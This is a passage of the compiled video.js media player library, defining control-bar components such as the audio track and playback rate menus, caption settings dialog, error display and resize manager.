    return 'vjs-audio-button ' + _TrackButton.prototype.buildWrapperCSSClass.call(this);
  };

  /**
   * Create a menu item for each audio track
   *
   * @param {AudioTrackMenuItem[]} [items=[]]
   *        An array of existing menu items to use.
   *
   * @return {AudioTrackMenuItem[]}
   *         An array of menu items
   */


  AudioTrackButton.prototype.createItems = function createItems() {
    var items = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];

    // if there's only one audio track, there no point in showing it
    this.hideThreshold_ = 1;

    var tracks = this.player_.audioTracks();

    for (var i = 0; i < tracks.length; i++) {
      var track = tracks[i];

      items.push(new AudioTrackMenuItem(this.player_, {
        track: track,
        // MenuItem is selectable
        selectable: true,
        // MenuItem is NOT multiSelectable (i.e. only one can be marked "selected" at a time)
        multiSelectable: false
      }));
    }

    return items;
  };

  return AudioTrackButton;
}(TrackButton);

/**
 * The text that should display over the `AudioTrackButton`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */


AudioTrackButton.prototype.controlText_ = 'Audio Track';
Component.registerComponent('AudioTrackButton', AudioTrackButton);

/**
 * @file playback-rate-menu-item.js
 */
/**
 * The specific menu item type for selecting a playback rate.
 *
 * @extends MenuItem
 */

var PlaybackRateMenuItem = function (_MenuItem) {
  inherits(PlaybackRateMenuItem, _MenuItem);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function PlaybackRateMenuItem(player, options) {
    classCallCheck(this, PlaybackRateMenuItem);

    var label = options.rate;
    var rate = parseFloat(label, 10);

    // Modify options for parent MenuItem class's init.
    options.label = label;
    options.selected = rate === 1;
    options.selectable = true;
    options.multiSelectable = false;

    var _this = possibleConstructorReturn(this, _MenuItem.call(this, player, options));

    _this.label = label;
    _this.rate = rate;

    _this.on(player, 'ratechange', _this.update);
    return _this;
  }

  /**
   * This gets called when an `PlaybackRateMenuItem` is "clicked". See
   * {@link ClickableComponent} for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} [event]
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  PlaybackRateMenuItem.prototype.handleClick = function handleClick(event) {
    _MenuItem.prototype.handleClick.call(this);
    this.player().playbackRate(this.rate);
  };

  /**
   * Update the PlaybackRateMenuItem when the playbackrate changes.
   *
   * @param {EventTarget~Event} [event]
   *        The `ratechange` event that caused this function to run.
   *
   * @listens Player#ratechange
   */


  PlaybackRateMenuItem.prototype.update = function update(event) {
    this.selected(this.player().playbackRate() === this.rate);
  };

  return PlaybackRateMenuItem;
}(MenuItem);

/**
 * The text that should display over the `PlaybackRateMenuItem`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */


PlaybackRateMenuItem.prototype.contentElType = 'button';

Component.registerComponent('PlaybackRateMenuItem', PlaybackRateMenuItem);

/**
 * @file playback-rate-menu-button.js
 */
/**
 * The component for controlling the playback rate.
 *
 * @extends MenuButton
 */

var PlaybackRateMenuButton = function (_MenuButton) {
  inherits(PlaybackRateMenuButton, _MenuButton);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function PlaybackRateMenuButton(player, options) {
    classCallCheck(this, PlaybackRateMenuButton);

    var _this = possibleConstructorReturn(this, _MenuButton.call(this, player, options));

    _this.updateVisibility();
    _this.updateLabel();

    _this.on(player, 'loadstart', _this.updateVisibility);
    _this.on(player, 'ratechange', _this.updateLabel);
    return _this;
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  PlaybackRateMenuButton.prototype.createEl = function createEl$$1() {
    var el = _MenuButton.prototype.createEl.call(this);

    this.labelEl_ = createEl('div', {
      className: 'vjs-playback-rate-value',
      innerHTML: '1x'
    });

    el.appendChild(this.labelEl_);

    return el;
  };

  PlaybackRateMenuButton.prototype.dispose = function dispose() {
    this.labelEl_ = null;

    _MenuButton.prototype.dispose.call(this);
  };

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  PlaybackRateMenuButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-playback-rate ' + _MenuButton.prototype.buildCSSClass.call(this);
  };

  PlaybackRateMenuButton.prototype.buildWrapperCSSClass = function buildWrapperCSSClass() {
    return 'vjs-playback-rate ' + _MenuButton.prototype.buildWrapperCSSClass.call(this);
  };

  /**
   * Create the playback rate menu
   *
   * @return {Menu}
   *         Menu object populated with {@link PlaybackRateMenuItem}s
   */


  PlaybackRateMenuButton.prototype.createMenu = function createMenu() {
    var menu = new Menu(this.player());
    var rates = this.playbackRates();

    if (rates) {
      for (var i = rates.length - 1; i >= 0; i--) {
        menu.addChild(new PlaybackRateMenuItem(this.player(), { rate: rates[i] + 'x' }));
      }
    }

    return menu;
  };

  /**
   * Updates ARIA accessibility attributes
   */


  PlaybackRateMenuButton.prototype.updateARIAAttributes = function updateARIAAttributes() {
    // Current playback rate
    this.el().setAttribute('aria-valuenow', this.player().playbackRate());
  };

  /**
   * This gets called when an `PlaybackRateMenuButton` is "clicked". See
   * {@link ClickableComponent} for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} [event]
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  PlaybackRateMenuButton.prototype.handleClick = function handleClick(event) {
    // select next rate option
    var currentRate = this.player().playbackRate();
    var rates = this.playbackRates();

    // this will select first one if the last one currently selected
    var newRate = rates[0];

    for (var i = 0; i < rates.length; i++) {
      if (rates[i] > currentRate) {
        newRate = rates[i];
        break;
      }
    }
    this.player().playbackRate(newRate);
  };

  /**
   * Get possible playback rates
   *
   * @return {Array}
   *         All possible playback rates
   */


  PlaybackRateMenuButton.prototype.playbackRates = function playbackRates() {
    return this.options_.playbackRates || this.options_.playerOptions && this.options_.playerOptions.playbackRates;
  };

  /**
   * Get whether playback rates is supported by the tech
   * and an array of playback rates exists
   *
   * @return {boolean}
   *         Whether changing playback rate is supported
   */


  PlaybackRateMenuButton.prototype.playbackRateSupported = function playbackRateSupported() {
    return this.player().tech_ && this.player().tech_.featuresPlaybackRate && this.playbackRates() && this.playbackRates().length > 0;
  };

  /**
   * Hide playback rate controls when they're no playback rate options to select
   *
   * @param {EventTarget~Event} [event]
   *        The event that caused this function to run.
   *
   * @listens Player#loadstart
   */


  PlaybackRateMenuButton.prototype.updateVisibility = function updateVisibility(event) {
    if (this.playbackRateSupported()) {
      this.removeClass('vjs-hidden');
    } else {
      this.addClass('vjs-hidden');
    }
  };

  /**
   * Update button label when rate changed
   *
   * @param {EventTarget~Event} [event]
   *        The event that caused this function to run.
   *
   * @listens Player#ratechange
   */


  PlaybackRateMenuButton.prototype.updateLabel = function updateLabel(event) {
    if (this.playbackRateSupported()) {
      this.labelEl_.innerHTML = this.player().playbackRate() + 'x';
    }
  };

  return PlaybackRateMenuButton;
}(MenuButton);

/**
 * The text that should display over the `FullscreenToggle`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */


PlaybackRateMenuButton.prototype.controlText_ = 'Playback Rate';

Component.registerComponent('PlaybackRateMenuButton', PlaybackRateMenuButton);

/**
 * @file spacer.js
 */
/**
 * Just an empty spacer element that can be used as an append point for plugins, etc.
 * Also can be used to create space between elements when necessary.
 *
 * @extends Component
 */

var Spacer = function (_Component) {
  inherits(Spacer, _Component);

  function Spacer() {
    classCallCheck(this, Spacer);
    return possibleConstructorReturn(this, _Component.apply(this, arguments));
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */
  Spacer.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-spacer ' + _Component.prototype.buildCSSClass.call(this);
  };

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  Spacer.prototype.createEl = function createEl() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: this.buildCSSClass()
    });
  };

  return Spacer;
}(Component);

Component.registerComponent('Spacer', Spacer);

/**
 * @file custom-control-spacer.js
 */
/**
 * Spacer specifically meant to be used as an insertion point for new plugins, etc.
 *
 * @extends Spacer
 */

var CustomControlSpacer = function (_Spacer) {
  inherits(CustomControlSpacer, _Spacer);

  function CustomControlSpacer() {
    classCallCheck(this, CustomControlSpacer);
    return possibleConstructorReturn(this, _Spacer.apply(this, arguments));
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */
  CustomControlSpacer.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-custom-control-spacer ' + _Spacer.prototype.buildCSSClass.call(this);
  };

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  CustomControlSpacer.prototype.createEl = function createEl() {
    var el = _Spacer.prototype.createEl.call(this, {
      className: this.buildCSSClass()
    });

    // No-flex/table-cell mode requires there be some content
    // in the cell to fill the remaining space of the table.
    el.innerHTML = '\xA0';
    return el;
  };

  return CustomControlSpacer;
}(Spacer);

Component.registerComponent('CustomControlSpacer', CustomControlSpacer);

/**
 * @file control-bar.js
 */
// Required children
/**
 * Container of main controls.
 *
 * @extends Component
 */

var ControlBar = function (_Component) {
  inherits(ControlBar, _Component);

  function ControlBar() {
    classCallCheck(this, ControlBar);
    return possibleConstructorReturn(this, _Component.apply(this, arguments));
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */
  ControlBar.prototype.createEl = function createEl() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-control-bar',
      dir: 'ltr'
    });
  };

  return ControlBar;
}(Component);

/**
 * Default options for `ControlBar`
 *
 * @type {Object}
 * @private
 */


ControlBar.prototype.options_ = {
  children: ['playToggle', 'volumePanel', 'currentTimeDisplay', 'timeDivider', 'durationDisplay', 'progressControl', 'liveDisplay', 'remainingTimeDisplay', 'customControlSpacer', 'playbackRateMenuButton', 'chaptersButton', 'descriptionsButton', 'subsCapsButton', 'audioTrackButton', 'fullscreenToggle']
};

Component.registerComponent('ControlBar', ControlBar);

/**
 * @file error-display.js
 */
/**
 * A display that indicates an error has occurred. This means that the video
 * is unplayable.
 *
 * @extends ModalDialog
 */

var ErrorDisplay = function (_ModalDialog) {
  inherits(ErrorDisplay, _ModalDialog);

  /**
   * Creates an instance of this class.
   *
   * @param  {Player} player
   *         The `Player` that this class should be attached to.
   *
   * @param  {Object} [options]
   *         The key/value store of player options.
   */
  function ErrorDisplay(player, options) {
    classCallCheck(this, ErrorDisplay);

    var _this = possibleConstructorReturn(this, _ModalDialog.call(this, player, options));

    _this.on(player, 'error', _this.open);
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   *
   * @deprecated Since version 5.
   */


  ErrorDisplay.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-error-display ' + _ModalDialog.prototype.buildCSSClass.call(this);
  };

  /**
   * Gets the localized error message based on the `Player`s error.
   *
   * @return {string}
   *         The `Player`s error message localized or an empty string.
   */


  ErrorDisplay.prototype.content = function content() {
    var error = this.player().error();

    return error ? this.localize(error.message) : '';
  };

  return ErrorDisplay;
}(ModalDialog);

/**
 * The default options for an `ErrorDisplay`.
 *
 * @private
 */


ErrorDisplay.prototype.options_ = mergeOptions(ModalDialog.prototype.options_, {
  pauseOnOpen: false,
  fillAlways: true,
  temporary: false,
  uncloseable: true
});

Component.registerComponent('ErrorDisplay', ErrorDisplay);

/**
 * @file text-track-settings.js
 */
var LOCAL_STORAGE_KEY = 'vjs-text-track-settings';

var COLOR_BLACK = ['#000', 'Black'];
var COLOR_BLUE = ['#00F', 'Blue'];
var COLOR_CYAN = ['#0FF', 'Cyan'];
var COLOR_GREEN = ['#0F0', 'Green'];
var COLOR_MAGENTA = ['#F0F', 'Magenta'];
var COLOR_RED = ['#F00', 'Red'];
var COLOR_WHITE = ['#FFF', 'White'];
var COLOR_YELLOW = ['#FF0', 'Yellow'];

var OPACITY_OPAQUE = ['1', 'Opaque'];
var OPACITY_SEMI = ['0.5', 'Semi-Transparent'];
var OPACITY_TRANS = ['0', 'Transparent'];

// Configuration for the various <select> elements in the DOM of this component.
//
// Possible keys include:
//
// `default`:
//   The default option index. Only needs to be provided if not zero.
// `parser`:
//   A function which is used to parse the value from the selected option in
//   a customized way.
// `selector`:
//   The selector used to find the associated <select> element.
var selectConfigs = {
  backgroundColor: {
    selector: '.vjs-bg-color > select',
    id: 'captions-background-color-%s',
    label: 'Color',
    options: [COLOR_BLACK, COLOR_WHITE, COLOR_RED, COLOR_GREEN, COLOR_BLUE, COLOR_YELLOW, COLOR_MAGENTA, COLOR_CYAN]
  },

  backgroundOpacity: {
    selector: '.vjs-bg-opacity > select',
    id: 'captions-background-opacity-%s',
    label: 'Transparency',
    options: [OPACITY_OPAQUE, OPACITY_SEMI, OPACITY_TRANS]
  },

  color: {
    selector: '.vjs-fg-color > select',
    id: 'captions-foreground-color-%s',
    label: 'Color',
    options: [COLOR_WHITE, COLOR_BLACK, COLOR_RED, COLOR_GREEN, COLOR_BLUE, COLOR_YELLOW, COLOR_MAGENTA, COLOR_CYAN]
  },

  edgeStyle: {
    selector: '.vjs-edge-style > select',
    id: '%s',
    label: 'Text Edge Style',
    options: [['none', 'None'], ['raised', 'Raised'], ['depressed', 'Depressed'], ['uniform', 'Uniform'], ['dropshadow', 'Dropshadow']]
  },

  fontFamily: {
    selector: '.vjs-font-family > select',
    id: 'captions-font-family-%s',
    label: 'Font Family',
    options: [['proportionalSansSerif', 'Proportional Sans-Serif'], ['monospaceSansSerif', 'Monospace Sans-Serif'], ['proportionalSerif', 'Proportional Serif'], ['monospaceSerif', 'Monospace Serif'], ['casual', 'Casual'], ['script', 'Script'], ['small-caps', 'Small Caps']]
  },

  fontPercent: {
    selector: '.vjs-font-percent > select',
    id: 'captions-font-size-%s',
    label: 'Font Size',
    options: [['0.50', '50%'], ['0.75', '75%'], ['1.00', '100%'], ['1.25', '125%'], ['1.50', '150%'], ['1.75', '175%'], ['2.00', '200%'], ['3.00', '300%'], ['4.00', '400%']],
    'default': 2,
    parser: function parser(v) {
      return v === '1.00' ? null : Number(v);
    }
  },

  textOpacity: {
    selector: '.vjs-text-opacity > select',
    id: 'captions-foreground-opacity-%s',
    label: 'Transparency',
    options: [OPACITY_OPAQUE, OPACITY_SEMI]
  },

  // Options for this object are defined below.
  windowColor: {
    selector: '.vjs-window-color > select',
    id: 'captions-window-color-%s',
    label: 'Color'
  },

  // Options for this object are defined below.
  windowOpacity: {
    selector: '.vjs-window-opacity > select',
    id: 'captions-window-opacity-%s',
    label: 'Transparency',
    options: [OPACITY_TRANS, OPACITY_SEMI, OPACITY_OPAQUE]
  }
};

selectConfigs.windowColor.options = selectConfigs.backgroundColor.options;

/**
 * Get the actual value of an option.
 *
 * @param  {string} value
 *         The value to get
 *
 * @param  {Function} [parser]
 *         Optional function to adjust the value.
 *
 * @return {Mixed}
 *         - Will be `undefined` if no value exists
 *         - Will be `undefined` if the given value is "none".
 *         - Will be the actual value otherwise.
 *
 * @private
 */
function parseOptionValue(value, parser) {
  if (parser) {
    value = parser(value);
  }

  if (value && value !== 'none') {
    return value;
  }
}

/**
 * Gets the value of the selected <option> element within a <select> element.
 *
 * @param  {Element} el
 *         the element to look in
 *
 * @param  {Function} [parser]
 *         Optional function to adjust the value.
 *
 * @return {Mixed}
 *         - Will be `undefined` if no value exists
 *         - Will be `undefined` if the given value is "none".
 *         - Will be the actual value otherwise.
 *
 * @private
 */
function getSelectedOptionValue(el, parser) {
  var value = el.options[el.options.selectedIndex].value;

  return parseOptionValue(value, parser);
}

/**
 * Sets the selected <option> element within a <select> element based on a
 * given value.
 *
 * @param {Element} el
 *        The element to look in.
 *
 * @param {string} value
 *        the property to look on.
 *
 * @param {Function} [parser]
 *        Optional function to adjust the value before comparing.
 *
 * @private
 */
function setSelectedOption(el, value, parser) {
  if (!value) {
    return;
  }

  for (var i = 0; i < el.options.length; i++) {
    if (parseOptionValue(el.options[i].value, parser) === value) {
      el.selectedIndex = i;
      break;
    }
  }
}

/**
 * Manipulate Text Tracks settings.
 *
 * @extends ModalDialog
 */

var TextTrackSettings = function (_ModalDialog) {
  inherits(TextTrackSettings, _ModalDialog);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *         The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *         The key/value store of player options.
   */
  function TextTrackSettings(player, options) {
    classCallCheck(this, TextTrackSettings);

    options.temporary = false;

    var _this = possibleConstructorReturn(this, _ModalDialog.call(this, player, options));

    _this.updateDisplay = bind(_this, _this.updateDisplay);

    // fill the modal and pretend we have opened it
    _this.fill();
    _this.hasBeenOpened_ = _this.hasBeenFilled_ = true;

    _this.endDialog = createEl('p', {
      className: 'vjs-control-text',
      textContent: _this.localize('End of dialog window.')
    });
    _this.el().appendChild(_this.endDialog);

    _this.setDefaults();

    // Grab `persistTextTrackSettings` from the player options if not passed in child options
    if (options.persistTextTrackSettings === undefined) {
      _this.options_.persistTextTrackSettings = _this.options_.playerOptions.persistTextTrackSettings;
    }

    _this.on(_this.$('.vjs-done-button'), 'click', function () {
      _this.saveSettings();
      _this.close();
    });

    _this.on(_this.$('.vjs-default-button'), 'click', function () {
      _this.setDefaults();
      _this.updateDisplay();
    });

    each(selectConfigs, function (config) {
      _this.on(_this.$(config.selector), 'change', _this.updateDisplay);
    });

    if (_this.options_.persistTextTrackSettings) {
      _this.restoreSettings();
    }
    return _this;
  }

  TextTrackSettings.prototype.dispose = function dispose() {
    this.endDialog = null;

    _ModalDialog.prototype.dispose.call(this);
  };

  /**
   * Create a <select> element with configured options.
   *
   * @param {string} key
   *        Configuration key to use during creation.
   *
   * @return {string}
   *         An HTML string.
   *
   * @private
   */


  TextTrackSettings.prototype.createElSelect_ = function createElSelect_(key) {
    var _this2 = this;

    var legendId = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : '';
    var type = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 'label';

    var config = selectConfigs[key];
    var id = config.id.replace('%s', this.id_);
    var selectLabelledbyIds = [legendId, id].join(' ').trim();

    return ['<' + type + ' id="' + id + '" class="' + (type === 'label' ? 'vjs-label' : '') + '">', this.localize(config.label), '</' + type + '>', '<select aria-labelledby="' + selectLabelledbyIds + '">'].concat(config.options.map(function (o) {
      var optionId = id + '-' + o[1].replace(/\W+/g, '');

      return ['<option id="' + optionId + '" value="' + o[0] + '" ', 'aria-labelledby="' + selectLabelledbyIds + ' ' + optionId + '">', _this2.localize(o[1]), '</option>'].join('');
    })).concat('</select>').join('');
  };

  /**
   * Create foreground color element for the component
   *
   * @return {string}
   *         An HTML string.
   *
   * @private
   */


  TextTrackSettings.prototype.createElFgColor_ = function createElFgColor_() {
    var legendId = 'captions-text-legend-' + this.id_;

    return ['<fieldset class="vjs-fg-color vjs-track-setting">', '<legend id="' + legendId + '">', this.localize('Text'), '</legend>', this.createElSelect_('color', legendId), '<span class="vjs-text-opacity vjs-opacity">', this.createElSelect_('textOpacity', legendId), '</span>', '</fieldset>'].join('');
  };

  /**
   * Create background color element for the component
   *
   * @return {string}
   *         An HTML string.
   *
   * @private
   */


  TextTrackSettings.prototype.createElBgColor_ = function createElBgColor_() {
    var legendId = 'captions-background-' + this.id_;

    return ['<fieldset class="vjs-bg-color vjs-track-setting">', '<legend id="' + legendId + '">', this.localize('Background'), '</legend>', this.createElSelect_('backgroundColor', legendId), '<span class="vjs-bg-opacity vjs-opacity">', this.createElSelect_('backgroundOpacity', legendId), '</span>', '</fieldset>'].join('');
  };

  /**
   * Create window color element for the component
   *
   * @return {string}
   *         An HTML string.
   *
   * @private
   */


  TextTrackSettings.prototype.createElWinColor_ = function createElWinColor_() {
    var legendId = 'captions-window-' + this.id_;

    return ['<fieldset class="vjs-window-color vjs-track-setting">', '<legend id="' + legendId + '">', this.localize('Window'), '</legend>', this.createElSelect_('windowColor', legendId), '<span class="vjs-window-opacity vjs-opacity">', this.createElSelect_('windowOpacity', legendId), '</span>', '</fieldset>'].join('');
  };

  /**
   * Create color elements for the component
   *
   * @return {Element}
   *         The element that was created
   *
   * @private
   */


  TextTrackSettings.prototype.createElColors_ = function createElColors_() {
    return createEl('div', {
      className: 'vjs-track-settings-colors',
      innerHTML: [this.createElFgColor_(), this.createElBgColor_(), this.createElWinColor_()].join('')
    });
  };

  /**
   * Create font elements for the component
   *
   * @return {Element}
   *         The element that was created.
   *
   * @private
   */


  TextTrackSettings.prototype.createElFont_ = function createElFont_() {
    return createEl('div', {
      className: 'vjs-track-settings-font',
      innerHTML: ['<fieldset class="vjs-font-percent vjs-track-setting">', this.createElSelect_('fontPercent', '', 'legend'), '</fieldset>', '<fieldset class="vjs-edge-style vjs-track-setting">', this.createElSelect_('edgeStyle', '', 'legend'), '</fieldset>', '<fieldset class="vjs-font-family vjs-track-setting">', this.createElSelect_('fontFamily', '', 'legend'), '</fieldset>'].join('')
    });
  };

  /**
   * Create controls for the component
   *
   * @return {Element}
   *         The element that was created.
   *
   * @private
   */


  TextTrackSettings.prototype.createElControls_ = function createElControls_() {
    var defaultsDescription = this.localize('restore all settings to the default values');

    return createEl('div', {
      className: 'vjs-track-settings-controls',
      innerHTML: ['<button class="vjs-default-button" title="' + defaultsDescription + '">', this.localize('Reset'), '<span class="vjs-control-text"> ' + defaultsDescription + '</span>', '</button>', '<button class="vjs-done-button">' + this.localize('Done') + '</button>'].join('')
    });
  };

  TextTrackSettings.prototype.content = function content() {
    return [this.createElColors_(), this.createElFont_(), this.createElControls_()];
  };

  TextTrackSettings.prototype.label = function label() {
    return this.localize('Caption Settings Dialog');
  };

  TextTrackSettings.prototype.description = function description() {
    return this.localize('Beginning of dialog window. Escape will cancel and close the window.');
  };

  TextTrackSettings.prototype.buildCSSClass = function buildCSSClass() {
    return _ModalDialog.prototype.buildCSSClass.call(this) + ' vjs-text-track-settings';
  };

  /**
   * Gets an object of text track settings (or null).
   *
   * @return {Object}
   *         An object with config values parsed from the DOM or localStorage.
   */


  TextTrackSettings.prototype.getValues = function getValues() {
    var _this3 = this;

    return reduce(selectConfigs, function (accum, config, key) {
      var value = getSelectedOptionValue(_this3.$(config.selector), config.parser);

      if (value !== undefined) {
        accum[key] = value;
      }

      return accum;
    }, {});
  };

  /**
   * Sets text track settings from an object of values.
   *
   * @param {Object} values
   *        An object with config values parsed from the DOM or localStorage.
   */


  TextTrackSettings.prototype.setValues = function setValues(values) {
    var _this4 = this;

    each(selectConfigs, function (config, key) {
      setSelectedOption(_this4.$(config.selector), values[key], config.parser);
    });
  };

  /**
   * Sets all `<select>` elements to their default values.
   */


  TextTrackSettings.prototype.setDefaults = function setDefaults() {
    var _this5 = this;

    each(selectConfigs, function (config) {
      var index = config.hasOwnProperty('default') ? config['default'] : 0;

      _this5.$(config.selector).selectedIndex = index;
    });
  };

  /**
   * Restore texttrack settings from localStorage
   */


  TextTrackSettings.prototype.restoreSettings = function restoreSettings() {
    var values = void 0;

    try {
      values = JSON.parse(window_1.localStorage.getItem(LOCAL_STORAGE_KEY));
    } catch (err) {
      log$1.warn(err);
    }

    if (values) {
      this.setValues(values);
    }
  };

  /**
   * Save text track settings to localStorage
   */


  TextTrackSettings.prototype.saveSettings = function saveSettings() {
    if (!this.options_.persistTextTrackSettings) {
      return;
    }

    var values = this.getValues();

    try {
      if (Object.keys(values).length) {
        window_1.localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(values));
      } else {
        window_1.localStorage.removeItem(LOCAL_STORAGE_KEY);
      }
    } catch (err) {
      log$1.warn(err);
    }
  };

  /**
   * Update display of text track settings
   */


  TextTrackSettings.prototype.updateDisplay = function updateDisplay() {
    var ttDisplay = this.player_.getChild('textTrackDisplay');

    if (ttDisplay) {
      ttDisplay.updateDisplay();
    }
  };

  /**
   * conditionally blur the element and refocus the captions button
   *
   * @private
   */


  TextTrackSettings.prototype.conditionalBlur_ = function conditionalBlur_() {
    this.previouslyActiveEl_ = null;
    this.off(document_1, 'keydown', this.handleKeyDown);

    var cb = this.player_.controlBar;
    var subsCapsBtn = cb && cb.subsCapsButton;
    var ccBtn = cb && cb.captionsButton;

    if (subsCapsBtn) {
      subsCapsBtn.focus();
    } else if (ccBtn) {
      ccBtn.focus();
    }
  };

  return TextTrackSettings;
}(ModalDialog);

Component.registerComponent('TextTrackSettings', TextTrackSettings);

/**
 * @file resize-manager.js
 */
/**
 * A Resize Manager. It is in charge of triggering `playerresize` on the player in the right conditions.
 *
 * It'll either create an iframe and use a debounced resize handler on it or use the new {@link https://wicg.github.io/ResizeObserver/|ResizeObserver}.
 *
 * If the ResizeObserver is available natively, it will be used. A polyfill can be passed in as an option.
 * If a `playerresize` event is not needed, the ResizeManager component can be removed from the player, see the example below.
 * @example <caption>How to disable the resize manager</caption>
 * const player = videojs('#vid', {
 *   resizeManager: false
 * });
 *
 * @see {@link https://wicg.github.io/ResizeObserver/|ResizeObserver specification}
 *
 * @extends Component
 */

var ResizeManager = function (_Component) {
  inherits(ResizeManager, _Component);

  /**
   * Create the ResizeManager.
   *
   * @param {Object} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of ResizeManager options.
   *
   * @param {Object} [options.ResizeObserver]
   *        A polyfill for ResizeObserver can be passed in here.
   *        If this is set to null it will ignore the native ResizeObserver and fall back to the iframe fallback.
   */
  function ResizeManager(player, options) {
    classCallCheck(this, ResizeManager);

    var RESIZE_OBSERVER_AVAILABLE = options.ResizeObserver || window_1.ResizeObserver;

    // if `null` was passed, we want to disable the ResizeObserver
    if (options.ResizeObserver === null) {
      RESIZE_OBSERVER_AVAILABLE = false;
    }

    // Only create an element when ResizeObserver isn't available
    var options_ = mergeOptions({ createEl: !RESIZE_OBSERVER_AVAILABLE }, options);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options_));

    _this.ResizeObserver = options.ResizeObserver || window_1.ResizeObserver;
    _this.loadListener_ = null;
    _this.resizeObserver_ = null;
    _this.debouncedHandler_ = debounce(function () {
      _this.resizeHandler();
    }, 100, false, player);

    if (RESIZE_OBSERVER_AVAILABLE) {
      _this.resizeObserver_ = new _this.ResizeObserver(_this.debouncedHandler_);
      _this.resizeObserver_.observe(player.el());
    } else {
      _this.loadListener_ = function () {
        if (_this.el_.contentWindow) {
          on(_this.el_.contentWindow, 'resize', _this.debouncedHandler_);
        }
        _this.off('load', _this.loadListener_);
      };

      _this.on('load', _this.loadListener_);
    }
    return _this;
  }

  ResizeManager.prototype.createEl = function createEl() {
    return _Component.prototype.createEl.call(this, 'iframe', {
      className: 'vjs-resize-manager'
    });
  };

  /**
   * Called when a resize is triggered on the iframe or a resize is observed via the ResizeObserver
   *
   * @fires Player#playerresize
   */


  ResizeManager.prototype.resizeHandler = function resizeHandler() {
    /**
     * Called when the player size has changed
     *
     * @event Player#playerresize
     * @type {EventTarget~Event}
     */
    this.player_.trigger('playerresize');
  };

  ResizeManager.prototype.dispose = function dispose() {
    if (this.resizeObserver_) {
      if (this.player_.el()) {
        this.resizeObserver_.unobserve(this.player_.el());
      }
      this.resizeObserver_.disconnect();
    }

    if (this.el_ && this.el_.contentWindow) {
      off(this.el_.contentWindow, 'resize', this.debouncedHandler_);
    }

    if (this.loadListener_) {
      this.off('load', this.loadListener_);
    }

    this.ResizeObserver = null;
    this.resizeObserver = null;
    this.debouncedHandler_ = null;
    this.loadListener_ = null;
  };

  return ResizeManager;
}(Component);

Component.registerComponent('ResizeManager', ResizeManager);

/**
 * This function is used to fire a sourceset when there is something
 * similar to `mediaEl.load()` being called. It will try to find the source via
 * the `src` attribute and then the `<source>` elements. It will then fire `sourceset`
 * with the source that was found or empty string if we cannot know. If it cannot
 * find a source then `sourceset` will not be fired.
 *
 * @param {Html5} tech
 *        The tech object that sourceset was setup on
 *
 * @return {boolean}
 *         returns false if the sourceset was not fired and true otherwise.
 */
var sourcesetLoad = function sourcesetLoad(tech) {
  var el = tech.el();

  // if `el.src` is set, that source will be loaded.
  if (el.hasAttribute('src')) {
    tech.triggerSourceset(el.src);
    return true;
  }

  /**
   * Since there isn't a src property on the media element, source elements will be used for
   * implementing the source selection algorithm. This happens asynchronously and
   * for most cases were there is more than one source we cannot tell what source will
   * be loaded, without re-implementing the source selection algorithm. At this time we are not
   * going to do that. There are three special cases that we do handle here though:
   *
   * 1. If there are no sources, do not fire `sourceset`.
   * 2. If there is only one `<source>` with a `src` property/attribute that is our `src`
   * 3. If there is more than one `<source>` but all of them have the same `src` url.
   *    That will be our src.
   */
  var sources = tech.$$('source');
  var srcUrls = [];
  var src = '';

  // if there are no sources, do not fire sourceset
  if (!sources.length) {
    return false;
  }

  // only count valid/non-duplicate source elements
  for (var i = 0; i < sources.length; i++) {
    var url = sources[i].src;

    if (url && srcUrls.indexOf(url) === -1) {
      srcUrls.push(url);
    }
  }

  // there were no valid sources
  if (!srcUrls.length) {
    return false;
  }

  // there is only one valid source element url
  // use that
  if (srcUrls.length === 1) {
    src = srcUrls[0];
  }

  tech.triggerSourceset(src);
  return true;
};

/**
 * our implementation of an `innerHTML` descriptor for browsers
 * that do not have one.
 */
var innerHTMLDescriptorPolyfill = {};

if (!IS_IE8) {
  innerHTMLDescriptorPolyfill = Object.defineProperty({}, 'innerHTML', {
    get: function get() {
      return this.cloneNode(true).innerHTML;
    },
    set: function set(v) {
      // make a dummy node to use innerHTML on
      var dummy = document_1.createElement(this.nodeName.toLowerCase());

      // set innerHTML to the value provided
      dummy.innerHTML = v;

      // make a document fragment to hold the nodes from dummy
      var docFrag = document_1.createDocumentFragment();

